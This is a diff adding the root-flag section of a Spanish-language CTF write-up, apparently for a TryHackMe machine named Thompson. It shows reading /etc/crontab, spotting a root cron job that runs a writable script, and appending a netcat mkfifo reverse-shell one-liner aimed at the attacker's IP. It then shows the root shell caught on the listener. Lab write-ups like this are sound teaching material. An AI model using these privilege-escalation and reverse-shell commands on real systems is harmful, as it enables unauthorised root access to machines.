@@ -218,5 +218,67 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ## Bandera root
 
+- Busqueda de vulnerabilidades con el siguiente comando:
 
+~~~css
+tomcat@ubuntu:/home/jack$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *	* * *	root	cd /home/jack && bash id.sh
+~~~
+
+- De acuerdo con lo anterior encontramos un posible vector en el script ***id.sh***, el cual procedemos a listar y nos encotramos que hace llamado al archivo ***test.txt***:
+
+~~~css
+tomcat@ubuntu:/home/jack$ cat id.sh
+cat id.sh
+#!/bin/bash
+id > test.txt
+~~~
+
+- Procedemos a modificar le script anterior para que nos ejecute una reverse shell a la máquina atacante con el siguiente comando:
+
+~~~css
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.43 4444 >/tmp/f" >> /home/jack/id.sh
+~~~
+
+- Nos ponemos en escucha por el puerto ***4444*** y ejecutamos el script, ganando nuestra shell como usuario root y su respectiva bandera:
+  
+~~~css
+└─# nc -nlvp 4444                                                                         
+listening on [any] 4444 ...
+connect to [10.9.0.43] from (UNKNOWN) [10.10.25.173] 46032
+sh: 0: can't access tty; job control turned off
+# whoami
+root
+~~~
+
+![rootFlag](/assets/images/thm-writeup-thompson/thompson_root.png)
+
+---
+
+## Fuentes
+
+- Metasploit
+<https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/>
+
+---
+<https://book.hacktricks.xyz/pentesting/8009-pentesting-apache-jserv-protocol-ajp>
+
+---
+
+- Root reverse-shell
+<https://mica-carol-fc0.notion.site/Easy-Peasy-8f0a8d2c8fe8458cb296b3773f33a7ff>
